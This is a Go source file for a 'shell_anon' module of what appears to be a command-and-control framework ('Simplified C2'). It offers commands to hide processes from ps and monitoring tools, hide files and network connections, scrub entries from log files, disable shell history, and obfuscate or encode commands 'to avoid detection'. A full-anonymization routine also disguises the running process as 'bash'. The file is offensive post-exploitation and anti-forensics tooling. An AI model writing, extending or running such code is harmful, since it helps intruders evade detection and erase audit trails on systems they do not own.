package shell_anon

import (
	"fmt"
	"os"
	"runtime"

	"github.com/0xvyper/mihra/module"
)

type Module struct {
	Name          string
	Version       string
	Description   string
	Author        string
	anonymizer    *ShellAnonymizer
	processHider  *ProcessHider
	fileHider     *FileHider
	networkHider  *NetworkHider
	cmdObfuscator *CommandObfuscator
}

func NewModule() *Module {
	return &Module{
		Name:          "shell_anon",
		Version:       "1.0.0",
		Description:   "Shell anonymization module for hiding commands, processes, files, and network connections",
		Author:        "Simplified C2",
		anonymizer:    NewShellAnonymizer(),
		processHider:  NewProcessHider(),
		fileHider:     NewFileHider(),
		networkHider:  NewNetworkHider(),
		cmdObfuscator: NewCommandObfuscator(),
	}
}
func (m *Module) GetInfo() *module.ModuleInfo {
	return &module.ModuleInfo{
		Name:        m.Name,
		Version:     m.Version,
		Description: m.Description,
		Author:      m.Author,
		Commands: []module.CommandInfo{
			{
				Name:        "setup",
				Description: "Set up a secure shell environment",
				Usage:       "setup",
				Options:     map[string]string{},
			},
			{
				Name:        "generate_script",
				Description: "Generate a shell script for setting up a secure environment",
				Usage:       "generate_script <output_path>",
				Options:     map[string]string{},
			},
			{
				Name:        "hide_process",
				Description: "Hide a process from monitoring tools",
				Usage:       "hide_process <pid> <new_name>",
				Options:     map[string]string{},
			},
			{
				Name:        "hide_file",
				Description: "Hide a file from ls command",
				Usage:       "hide_file <path>",
				Options:     map[string]string{},
			},
			{
				Name:        "clean_log",
				Description: "Clean entries from a log file",
				Usage:       "clean_log <log_path> <pattern>",
				Options:     map[string]string{},
			},
			{
				Name:        "secure_delete",
				Description: "Securely delete a file",
				Usage:       "secure_delete <path>",
				Options:     map[string]string{},
			},
			{
				Name:        "obfuscate_command",
				Description: "Obfuscate a command to avoid detection",
				Usage:       "obfuscate_command <command>",
				Options:     map[string]string{},
			},
			{
				Name:        "encode_command",
				Description: "Encode a command using base64",
				Usage:       "encode_command <command>",
				Options:     map[string]string{},
			},
			{
				Name:        "hide_connection",
				Description: "Hide a network connection",
				Usage:       "hide_connection <port>",
				Options:     map[string]string{},
			},
			{
				Name:        "get_tips",
				Description: "Get anonymization tips",
				Usage:       "get_tips <category>",
				Options: map[string]string{
					"category": "command|process|file|network|all",
				},
			},
			{
				Name:        "status",
				Description: "Get anonymization status",
				Usage:       "status",
				Options:     map[string]string{},
			},
		},
		Options: map[string]string{
			"enabled": "true",
		},
	}
}
func (m *Module) Initialize() error {
	return nil
}
func (m *Module) ExecuteCommand(command string, args []string) (interface{}, error) {
	switch command {
	case "setup":
		return "Shell environment secured", m.anonymizer.SetupHackShell()

	case "generate_script":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing output path")
		}
		script := m.anonymizer.GenerateHackShellScript()
		return "Script generated", os.WriteFile(args[0], []byte(script), 0755)

	case "hide_process":
		if len(args) < 2 {
			return nil, fmt.Errorf("missing pid or new name")
		}
		pid := 0
		fmt.Sscanf(args[0], "%d", &pid)
		if pid <= 0 {
			return nil, fmt.Errorf("invalid pid")
		}
		return "Process hidden", m.processHider.HideProcess(pid, args[1])

	case "hide_file":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing file path")
		}
		return "File hidden", m.fileHider.HideFile(args[0])

	case "clean_log":
		if len(args) < 2 {
			return nil, fmt.Errorf("missing log path or pattern")
		}
		return "Log cleaned", m.fileHider.CleanLogFile(args[0], args[1])

	case "secure_delete":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing file path")
		}
		return "File securely deleted", m.fileHider.SecureDelete(args[0])

	case "obfuscate_command":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing command")
		}
		return m.cmdObfuscator.ObfuscateCommand(args[0]), nil

	case "encode_command":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing command")
		}
		return m.cmdObfuscator.EncodeCommand(args[0]), nil

	case "hide_connection":
		if len(args) < 1 {
			return nil, fmt.Errorf("missing port")
		}
		port := 0
		fmt.Sscanf(args[0], "%d", &port)
		if port <= 0 || port > 65535 {
			return nil, fmt.Errorf("invalid port")
		}
		return "Connection hidden", m.networkHider.HideConnection(port)

	case "get_tips":
		category := "all"
		if len(args) > 0 {
			category = args[0]
		}

		var tips []string
		switch category {
		case "command":
			tips = m.cmdObfuscator.GetCommandObfuscationTips()
		case "process":
			tips = m.processHider.GetProcessHidingTips()
		case "file":
			tips = m.fileHider.GetFileHidingTips()
		case "network":
			tips = m.networkHider.GetNetworkHidingTips()
		case "all":
			tips = append(tips, m.anonymizer.GetHiddenCommandTips()...)
			tips = append(tips, m.processHider.GetProcessHidingTips()...)
			tips = append(tips, m.fileHider.GetFileHidingTips()...)
			tips = append(tips, m.networkHider.GetNetworkHidingTips()...)
		default:
			return nil, fmt.Errorf("invalid category: %s", category)
		}

		return tips, nil

	case "status":
		status := make(map[string]interface{})

		histFile := os.Getenv("HISTFILE")
		status["history_disabled"] = (histFile == "/dev/null" || histFile == "")

		status["process_hiding_supported"] = (runtime.GOOS == "linux")

		tmpDir := os.Getenv("TMPDIR")
		status["secure_tmpdir"] = (tmpDir == "/dev/shm")

		return status, nil

	default:
		return nil, fmt.Errorf("unknown command: %s", command)
	}
}
func (m *Module) SetupHackShell() error {
	return m.anonymizer.SetupHackShell()
}
func (m *Module) GenerateHackShellScript(outputPath string) error {
	script := m.anonymizer.GenerateHackShellScript()
	return os.WriteFile(outputPath, []byte(script), 0755)
}
func (m *Module) DisableHistory() error {
	return m.anonymizer.DisableHistory()
}
func (m *Module) RestoreHistory() error {
	return m.anonymizer.RestoreHistory()
}
func (m *Module) HideProcess(pid int, newName string) error {
	return m.processHider.HideProcess(pid, newName)
}
func (m *Module) HideCurrentProcess(newName string) error {
	return m.processHider.HideCurrentProcess(newName)
}
func (m *Module) HideFromPS() error {
	return m.processHider.HideFromPS()
}
func (m *Module) HideConnection(port int) error {
	return m.networkHider.HideConnection(port)
}
func (m *Module) ObfuscateNetworkTraffic(data []byte) []byte {
	return m.networkHider.ObfuscateNetworkTraffic(data)
}
func (m *Module) DeobfuscateNetworkTraffic(obfuscated []byte) []byte {
	return m.networkHider.DeobfuscateNetworkTraffic(obfuscated)
}
func (m *Module) HideFile(path string) error {
	return m.fileHider.HideFile(path)
}
func (m *Module) CleanLogFile(logPath string, pattern string) error {
	return m.fileHider.CleanLogFile(logPath, pattern)
}
func (m *Module) SecureDelete(path string) error {
	return m.fileHider.SecureDelete(path)
}
func (m *Module) ObfuscateCommand(command string) string {
	return m.cmdObfuscator.ObfuscateCommand(command)
}
func (m *Module) EncodeCommand(command string) string {
	return m.cmdObfuscator.EncodeCommand(command)
}
func (m *Module) GetAnonymizationStatus() map[string]interface{} {
	status := make(map[string]interface{})

	histFile := os.Getenv("HISTFILE")
	status["history_disabled"] = (histFile == "/dev/null" || histFile == "")

	status["process_hiding_supported"] = (runtime.GOOS == "linux")

	tmpDir := os.Getenv("TMPDIR")
	status["secure_tmpdir"] = (tmpDir == "/dev/shm")

	return status
}
func (m *Module) ApplyFullAnonymization() error {

	if err := m.SetupHackShell(); err != nil {
		return fmt.Errorf("failed to setup hack shell: %v", err)
	}

	if runtime.GOOS == "linux" {
		if err := m.HideCurrentProcess("bash"); err != nil {

			fmt.Printf("Warning: failed to hide current process: %v\n", err)
		}

		if err := m.HideFromPS(); err != nil {

			fmt.Printf("Warning: failed to hide from ps: %v\n", err)
		}
	}

	return nil
}
